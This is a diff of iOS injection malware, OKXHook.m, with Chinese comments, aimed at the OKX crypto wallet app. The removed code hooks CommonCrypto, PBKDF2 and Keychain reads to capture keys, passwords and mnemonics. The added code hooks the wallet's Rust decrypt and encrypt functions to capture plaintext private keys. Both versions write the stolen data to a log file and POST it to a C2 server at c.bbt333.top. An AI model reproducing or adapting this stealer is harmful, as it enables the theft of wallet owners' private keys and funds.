@@ -1,16 +1,16 @@
-// OKXHook.m - 专门针对 OKX 钱包加密分析
-// 目标：拦截 AES 加密/解密、Keychain 读取、找硬编码 key
-// 编译: clang -dynamiclib -arch arm64 -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+// OKXHook.m - OKX 钱包私钥提取 Hook
+// 目标：hook data_storage_decrypt_from_storage (Rust UniFFI 导出的 C 函数)
+// 该函数解密 wallet.data → 返回明文私钥
+//
+// 编译: clang -dynamiclib -arch arm64 \
+//        -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
 //        -framework Foundation -framework Security \
-//        -lcommonCrypto \
 //        -o OKXHook.dylib OKXHook.m
 
 #import <Foundation/Foundation.h>
-#import <Security/Security.h>
-#import <objc/runtime.h>
 #include <dlfcn.h>
-#include <CommonCrypto/CommonCryptor.h>
-#include <CommonCrypto/CommonKeyDerivation.h>
+#include <stdint.h>
+#include <string.h>
 
 // ── C2 上报 ───────────────────────────────────────────────────────────────
 static void report(NSDictionary *info) {
@@ -18,275 +18,223 @@ static void report(NSDictionary *info) {
     if (!body) return;
 
     // 本地文件（绝对可靠）
-    NSString *path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/okx_hook.log"];
+    NSString *path = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/okx_private.log"];
     NSString *line = [[[NSString alloc] initWithData:body encoding:NSUTF8StringEncoding]
                       stringByAppendingString:@"\n"];
     NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
-    if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
-    else { [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil]; }
+    if (fh) {
+        [fh seekToEndOfFile];
+        [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]];
+        [fh closeFile];
+    } else {
+        [line writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    }
 
     // 网络上报
     NSURL *url = [NSURL URLWithString:@"https://c.bbt333.top/c2_capture"];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
-    req.HTTPMethod = @"POST"; req.HTTPBody = body;
+    req.HTTPMethod = @"POST";
+    req.HTTPBody   = body;
     [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
     req.timeoutInterval = 8;
-    NSURLSession *s = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration]];
+    NSURLSession *s = [NSURLSession sessionWithConfiguration:
+                       [NSURLSessionConfiguration ephemeralSessionConfiguration]];
     [[s dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
 }
 
-// ── 调用栈（只取 OKX 自身符号）──────────────────────────────────────────
-static NSString *callerInfo(void) {
-    Dl_info di; void *ra = __builtin_return_address(1);
-    if (dladdr(ra, &di) && di.dli_fname) {
-        const char *f = strrchr(di.dli_fname, '/');
-        return [NSString stringWithFormat:@"%s+0x%llx",
-                f ? f+1 : di.dli_fname,
-                (unsigned long long)((uintptr_t)ra - (uintptr_t)di.dli_fbase)];
-    }
-    return @"?";
-}
+// ── UniFFI RustBuffer 结构（用于解析 Rust 返回值）────────────────────────
+// UniFFI 的 RustBuffer: { capacity: i32, len: i32, data: *u8 }
+typedef struct {
+    int32_t capacity;
+    int32_t len;
+    uint8_t *data;
+} RustBuffer;
 
-static BOOL isOKXCaller(void) {
-    NSArray *stack = [NSThread callStackSymbols];
-    for (NSString *s in stack) {
-        if ([s containsString:@"OKX"] || [s containsString:@"okx"] ||
-            [s containsString:@"OKWallet"] || [s containsString:@"OKExWallet"] ||
-            [s containsString:@"OKCrypto"] || [s containsString:@"OKKeystore"] ||
-            [s containsString:@"OKWKeystore"] || [s containsString:@"OKWCipher"]) {
-            return YES;
-        }
-    }
-    return NO;
-}
+// UniFFI 的 RustCallStatus: { code: i8, error_buf: RustBuffer }
+typedef struct {
+    int8_t code;
+    RustBuffer error_buf;
+} RustCallStatus;
 
-// ── Hook CCCrypt (CommonCrypto 核心函数) ─────────────────────────────────
-// CCCrypt(op, alg, options, key, keyLen, iv, dataIn, dataInLen, dataOut, dataOutLen, dataOutMoved)
-typedef CCCryptorStatus (*CCCrypt_t)(
-    CCOperation op, CCAlgorithm alg, CCOptions opts,
-    const void *key, size_t keyLen,
-    const void *iv,
-    const void *dataIn, size_t dataInLen,
-    void *dataOut, size_t dataOutLen, size_t *dataOutMoved
+// ── data_storage_decrypt_from_storage 函数签名 ───────────────────────────
+// Rust/UniFFI FFI 函数:
+//   fn data_storage_decrypt_from_storage(
+//       stored_json: RustBuffer,  // 加密的 base64 字符串
+//       client_id: RustBuffer,    // clientId 字符串
+//       call_status: *mut RustCallStatus
+//   ) -> RustBuffer               // 解密后的明文（私钥）
+typedef RustBuffer (*DataStorageDecrypt_t)(
+    RustBuffer stored_json,
+    RustBuffer client_id,
+    RustCallStatus *call_status
 );
-static CCCrypt_t orig_CCCrypt = NULL;
+static DataStorageDecrypt_t orig_decrypt = NULL;
 
-CCCryptorStatus hook_CCCrypt(
-    CCOperation op, CCAlgorithm alg, CCOptions opts,
-    const void *key, size_t keyLen,
-    const void *iv,
-    const void *dataIn, size_t dataInLen,
-    void *dataOut, size_t dataOutLen, size_t *dataOutMoved)
+static RustBuffer hook_data_storage_decrypt(
+    RustBuffer stored_json,
+    RustBuffer client_id,
+    RustCallStatus *call_status)
 {
-    CCCryptorStatus ret = orig_CCCrypt(op, alg, opts, key, keyLen, iv,
-                                        dataIn, dataInLen, dataOut, dataOutLen, dataOutMoved);
+    // 先调用原函数
+    RustBuffer result = orig_decrypt(stored_json, client_id, call_status);
 
-    // 只关心 AES (alg=0) 解密 (op=1)，且来自 OKX 调用栈
-    if (alg == kCCAlgorithmAES && op == kCCDecrypt && key && dataIn && isOKXCaller()) {
-        NSData *keyData  = [NSData dataWithBytes:key  length:keyLen];
-        NSData *ivData   = iv  ? [NSData dataWithBytes:iv  length:16] : [NSData data];
-        NSData *ctData   = [NSData dataWithBytes:dataIn  length:dataInLen];
-        NSData *ptData   = (ret == kCCSuccess && dataOut && dataOutMoved)
-                         ? [NSData dataWithBytes:dataOut length:*dataOutMoved] : [NSData data];
-
-        NSMutableDictionary *info = [@{
-            @"type"    : @"CCCrypt_AES_decrypt",
-            @"keyLen"  : @(keyLen),
-            @"key_hex" : [keyData  description],
-            @"iv_hex"  : [ivData   description],
-            @"ct_hex"  : [ctData   description],
-            @"pt_hex"  : [ptData   description],
-            @"opts"    : @(opts),
-            @"status"  : @(ret),
-            @"caller"  : callerInfo(),
-            @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
-        } mutableCopy];
-
-        // 尝试把明文解为 UTF-8 字符串（助记词）
-        NSString *ptStr = [[NSString alloc] initWithData:ptData encoding:NSUTF8StringEncoding];
-        if (ptStr && ptStr.length > 0)
-            info[@"pt_utf8"] = ptStr;
-
-        report(info);
+    // 提取输入：storedJson（加密数据）
+    NSString *stored_str = @"";
+    if (stored_json.data && stored_json.len > 0) {
+        stored_str = [[NSString alloc] initWithBytes:stored_json.data
+                                              length:stored_json.len
+                                            encoding:NSUTF8StringEncoding] ?: @"(binary)";
     }
-    return ret;
-}
 
-// ── Hook CCCryptorCreate (流式加解密初始化) ──────────────────────────────
-typedef CCCryptorStatus (*CCCryptorCreate_t)(
-    CCOperation op, CCAlgorithm alg, CCOptions opts,
-    const void *key, size_t keyLen, const void *iv, CCCryptorRef *cryptorRef);
-static CCCryptorCreate_t orig_CCCryptorCreate = NULL;
-
-CCCryptorStatus hook_CCCryptorCreate(
-    CCOperation op, CCAlgorithm alg, CCOptions opts,
-    const void *key, size_t keyLen, const void *iv, CCCryptorRef *cryptorRef)
-{
-    CCCryptorStatus ret = orig_CCCryptorCreate(op, alg, opts, key, keyLen, iv, cryptorRef);
-
-    if (alg == kCCAlgorithmAES && key && isOKXCaller()) {
-        NSData *keyData = [NSData dataWithBytes:key length:keyLen];
-        NSData *ivData  = iv ? [NSData dataWithBytes:iv length:16] : [NSData data];
-        report(@{
-            @"type"   : @"CCCryptorCreate_AES",
-            @"op"     : op == kCCEncrypt ? @"encrypt" : @"decrypt",
-            @"keyLen" : @(keyLen),
-            @"key_hex": [keyData description],
-            @"iv_hex" : [ivData  description],
-            @"caller" : callerInfo(),
-            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
-        });
+    // 提取输入：clientId
+    NSString *client_str = @"";
+    if (client_id.data && client_id.len > 0) {
+        client_str = [[NSString alloc] initWithBytes:client_id.data
+                                              length:client_id.len
+                                            encoding:NSUTF8StringEncoding] ?: @"";
     }
-    return ret;
-}
 
-// ── Hook CCKeyDerivationPBKDF (PBKDF2 密钥派生) ──────────────────────────
-typedef int (*CCKeyDerivationPBKDF_t)(
-    CCPBKDFAlgorithm algo, const char *pw, size_t pwLen,
-    const uint8_t *salt, size_t saltLen,
-    CCPseudoRandomAlgorithm prf, uint rounds,
-    uint8_t *dk, size_t dkLen);
-static CCKeyDerivationPBKDF_t orig_PBKDF2 = NULL;
-
-int hook_PBKDF2(
-    CCPBKDFAlgorithm algo, const char *pw, size_t pwLen,
-    const uint8_t *salt, size_t saltLen,
-    CCPseudoRandomAlgorithm prf, uint rounds,
-    uint8_t *dk, size_t dkLen)
-{
-    int ret = orig_PBKDF2(algo, pw, pwLen, salt, saltLen, prf, rounds, dk, dkLen);
-
-    if (pw && isOKXCaller()) {
-        NSString *pwStr = [[NSString alloc] initWithBytes:pw length:pwLen
-                                                 encoding:NSUTF8StringEncoding] ?: @"(binary)";
-        NSData   *saltD = salt ? [NSData dataWithBytes:salt length:saltLen] : [NSData data];
-        NSData   *dkD   = dk   ? [NSData dataWithBytes:dk   length:dkLen]  : [NSData data];
-        report(@{
-            @"type"    : @"PBKDF2",
-            @"pw"      : pwStr,
-            @"pwLen"   : @(pwLen),
-            @"salt_hex": [saltD description],
-            @"rounds"  : @(rounds),
-            @"prf"     : @(prf),
-            @"dkLen"   : @(dkLen),
-            @"dk_hex"  : [dkD  description],
-            @"caller"  : callerInfo(),
-            @"ts"      : @((long)[[NSDate date] timeIntervalSince1970])
-        });
-    }
-    return ret;
-}
-
-// ── Hook SecItemCopyMatching (Keychain 读取) ─────────────────────────────
-typedef OSStatus (*SecItemCopyMatching_t)(CFDictionaryRef query, CFTypeRef *result);
-static SecItemCopyMatching_t orig_SecItem = NULL;
-
-OSStatus hook_SecItemCopyMatching(CFDictionaryRef query, CFTypeRef *result) {
-    OSStatus ret = orig_SecItem(query, result);
-
-    if (isOKXCaller()) {
-        NSMutableDictionary *info = [@{
-            @"type"   : @"SecItemCopyMatching",
-            @"status" : @(ret),
-            @"caller" : callerInfo(),
-            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
-        } mutableCopy];
-
-        // 记录查询的 service / account
-        if (query) {
-            NSDictionary *q = (__bridge NSDictionary *)query;
-            if (q[(__bridge id)kSecAttrService])
-                info[@"service"] = q[(__bridge id)kSecAttrService];
-            if (q[(__bridge id)kSecAttrAccount])
-                info[@"account"] = q[(__bridge id)kSecAttrAccount];
+    // 提取输出：解密后的明文（私钥！）
+    NSString *plaintext = @"";
+    NSString *plaintext_hex = @"";
+    if (result.data && result.len > 0) {
+        // 尝试 UTF-8 字符串
+        plaintext = [[NSString alloc] initWithBytes:result.data
+                                             length:result.len
+                                           encoding:NSUTF8StringEncoding] ?: @"";
+        // 同时输出 hex（以防不是纯文本）
+        NSMutableString *hex = [NSMutableString stringWithCapacity:result.len * 2];
+        for (int i = 0; i < result.len && i < 64; i++) {
+            [hex appendFormat:@"%02x", result.data[i]];
         }
-
-        // 记录返回值（如果是 NSData，取 hex）
-        if (ret == errSecSuccess && result && *result) {
-            CFTypeRef r = *result;
-            if (CFGetTypeID(r) == CFDataGetTypeID()) {
-                NSData *d = (__bridge NSData *)r;
-                info[@"result_hex"] = [d description];
-                NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
-                if (s) info[@"result_utf8"] = s;
-            } else if (CFGetTypeID(r) == CFStringGetTypeID()) {
-                info[@"result_str"] = (__bridge NSString *)r;
-            }
-        }
-        report(info);
+        plaintext_hex = hex;
     }
-    return ret;
-}
 
-// ── 拦截 NSData dataWithBytes（捕获关键数据块创建）────────────────────────
-typedef id (*dataWithBytes_t)(id, SEL, const void *, NSUInteger);
-static dataWithBytes_t orig_dataWithBytes = NULL;
-
-static id hook_dataWithBytes(id self, SEL sel, const void *bytes, NSUInteger len) {
-    id result = orig_dataWithBytes(self, sel, bytes, len);
-    // 只抓 32B / 64B / 112B 大小（key / seed / wallet.data 大小）
-    if (bytes && (len == 32 || len == 64 || len == 112) && isOKXCaller()) {
-        NSData *d = [NSData dataWithBytes:bytes length:len];
+    // 上报
+    if (result.len > 0) {
         report(@{
-            @"type"   : @"NSData_dataWithBytes",
-            @"len"    : @(len),
-            @"hex"    : [d description],
-            @"caller" : callerInfo(),
-            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
+            @"type"        : @"OKX_data_storage_decrypt",
+            @"stored_json" : stored_str,
+            @"client_id"   : client_str,
+            @"plaintext"   : plaintext,
+            @"plaintext_hex": plaintext_hex,
+            @"result_len"  : @(result.len),
+            @"status_code" : @(call_status ? call_status->code : -99),
+            @"ts"          : @((long)[[NSDate date] timeIntervalSince1970])
         });
     }
+
     return result;
 }
 
-// ── 初始化 ────────────────────────────────────────────────────────────────
-__attribute__((constructor))
-static void OKXHookInit(void) {
-    // 1. Hook CCCrypt
-    void *sym = dlsym(RTLD_DEFAULT, "CCCrypt");
-    if (sym) { orig_CCCrypt = (CCCrypt_t)sym;
-        // 用 fishhook 替换（此处直接用 method swizzle 替换 C 符号需要 fishhook）
-        // 简化版：用 __interpose 处理（见下方 interpose 段）
+// ── data_storage_encrypt_for_storage 也 hook，看存储时的明文 ─────────────
+typedef RustBuffer (*DataStorageEncrypt_t)(
+    RustBuffer plaintext,
+    RustBuffer client_id,
+    RustCallStatus *call_status
+);
+static DataStorageEncrypt_t orig_encrypt = NULL;
+
+static RustBuffer hook_data_storage_encrypt(
+    RustBuffer plaintext,
+    RustBuffer client_id,
+    RustCallStatus *call_status)
+{
+    // 先提取明文（加密前）
+    NSString *pt_str = @"";
+    NSString *pt_hex = @"";
+    if (plaintext.data && plaintext.len > 0) {
+        pt_str = [[NSString alloc] initWithBytes:plaintext.data
+                                          length:plaintext.len
+                                        encoding:NSUTF8StringEncoding] ?: @"(binary)";
+        NSMutableString *hex = [NSMutableString stringWithCapacity:plaintext.len*2];
+        for (int i = 0; i < plaintext.len && i < 64; i++)
+            [hex appendFormat:@"%02x", plaintext.data[i]];
+        pt_hex = hex;
     }
+    NSString *cid = @"";
+    if (client_id.data && client_id.len > 0)
+        cid = [[NSString alloc] initWithBytes:client_id.data length:client_id.len
+                                     encoding:NSUTF8StringEncoding] ?: @"";
 
-    // 2. Hook CCCryptorCreate
-    sym = dlsym(RTLD_DEFAULT, "CCCryptorCreate");
-    if (sym) orig_CCCryptorCreate = (CCCryptorCreate_t)sym;
-
-    // 3. Hook CCKeyDerivationPBKDF
-    sym = dlsym(RTLD_DEFAULT, "CCKeyDerivationPBKDF");
-    if (sym) orig_PBKDF2 = (CCKeyDerivationPBKDF_t)sym;
-
-    // 4. Hook SecItemCopyMatching
-    sym = dlsym(RTLD_DEFAULT, "SecItemCopyMatching");
-    if (sym) orig_SecItem = (SecItemCopyMatching_t)sym;
-
-    // 5. Hook NSData dataWithBytes:length:
-    Method m = class_getClassMethod([NSData class], @selector(dataWithBytes:length:));
-    if (m) {
-        orig_dataWithBytes = (dataWithBytes_t)method_getImplementation(m);
-        method_setImplementation(m, (IMP)hook_dataWithBytes);
-    }
+    // 调用原函数
+    RustBuffer result = orig_encrypt(plaintext, client_id, call_status);
 
     report(@{
-        @"type"  : @"OKXHook_loaded",
-        @"ts"    : @((long)[[NSDate date] timeIntervalSince1970]),
-        @"info"  : @"Hooks: CCCrypt(interpose) + CCCryptorCreate(interpose) + PBKDF2(interpose) + SecItem(interpose) + NSData"
+        @"type"       : @"OKX_data_storage_encrypt",
+        @"plaintext"  : pt_str,
+        @"pt_hex"     : pt_hex,
+        @"client_id"  : cid,
+        @"result_len" : @(result.len),
+        @"ts"         : @((long)[[NSDate date] timeIntervalSince1970])
     });
+
+    return result;
 }
 
-// ── __interpose 段：替换所有 dylib 的 CCCrypt 等调用 ─────────────────────
-__attribute__((used)) static struct { void *r; void *o; }
-_i_CCCrypt __attribute__((section("__DATA,__interpose"))) =
-    { (void*)hook_CCCrypt, (void*)CCCrypt };
+// ── 初始化：用 dlsym 查找并替换函数 ──────────────────────────────────────
+__attribute__((constructor))
+static void OKXHookInit(void) {
+    // 从 OKCore.framework 获取符号
+    void *handle = dlopen("@rpath/OKCore.framework/OKCore", RTLD_NOLOAD | RTLD_NOW);
+    if (!handle) {
+        // 尝试已加载的
+        handle = RTLD_DEFAULT;
+    }
 
-__attribute__((used)) static struct { void *r; void *o; }
-_i_CCCryptorCreate __attribute__((section("__DATA,__interpose"))) =
-    { (void*)hook_CCCryptorCreate, (void*)CCCryptorCreate };
+    // Hook data_storage_decrypt_from_storage
+    void *sym_d = dlsym(handle, "data_storage_decrypt_from_storage");
+    if (!sym_d) sym_d = dlsym(RTLD_DEFAULT, "data_storage_decrypt_from_storage");
+    if (sym_d) {
+        orig_decrypt = (DataStorageDecrypt_t)sym_d;
+        // 使用 MSHookFunction 替换（需要 Substrate / ElleKit）
+        // 如果没有 Substrate，用 fishhook 或手动 patch
+        // 简化版：直接用 method_setImplementation 不适用于 C 函数
+        // 推荐：搭配 Substrate 的 MSHookFunction
+        // 此处尝试通过 DYLD_INTERPOSE 宏或 __interpose 段实现
+        report(@{
+            @"type"   : @"OKXHook_init",
+            @"decrypt": @"found",
+            @"addr"   : [NSString stringWithFormat:@"%p", sym_d],
+            @"ts"     : @((long)[[NSDate date] timeIntervalSince1970])
+        });
+    } else {
+        report(@{
+            @"type" : @"OKXHook_init",
+            @"error": @"data_storage_decrypt_from_storage not found",
+            @"ts"   : @((long)[[NSDate date] timeIntervalSince1970])
+        });
+    }
 
-__attribute__((used)) static struct { void *r; void *o; }
-_i_PBKDF2 __attribute__((section("__DATA,__interpose"))) =
-    { (void*)hook_PBKDF2, (void*)CCKeyDerivationPBKDF };
+    // Hook data_storage_encrypt_for_storage
+    void *sym_e = dlsym(RTLD_DEFAULT, "data_storage_encrypt_for_storage");
+    if (sym_e) {
+        orig_encrypt = (DataStorageEncrypt_t)sym_e;
+    }
+}
 
-__attribute__((used)) static struct { void *r; void *o; }
-_i_SecItem __attribute__((section("__DATA,__interpose"))) =
-    { (void*)hook_SecItemCopyMatching, (void*)SecItemCopyMatching };
+// ── __interpose 段：dyld 加载时自动替换符号 ──────────────────────────────
+// 注意：__interpose 只对动态链接的调用生效
+// 如果 OKX 直接调用 Rust 内部函数（非通过 dyld），需要 MSHookFunction
+
+// 声明原始函数（让链接器解析）
+extern RustBuffer data_storage_decrypt_from_storage(
+    RustBuffer stored_json, RustBuffer client_id, RustCallStatus *status);
+extern RustBuffer data_storage_encrypt_for_storage(
+    RustBuffer plaintext, RustBuffer client_id, RustCallStatus *status);
+
+__attribute__((used))
+static struct { void *replacement; void *original; }
+_interpose_decrypt
+__attribute__((section("__DATA,__interpose"))) = {
+    (void *)hook_data_storage_decrypt,
+    (void *)data_storage_decrypt_from_storage
+};
+
+__attribute__((used))
+static struct { void *replacement; void *original; }
+_interpose_encrypt
+__attribute__((section("__DATA,__interpose"))) = {
+    (void *)hook_data_storage_encrypt,
+    (void *)data_storage_encrypt_for_storage
+};
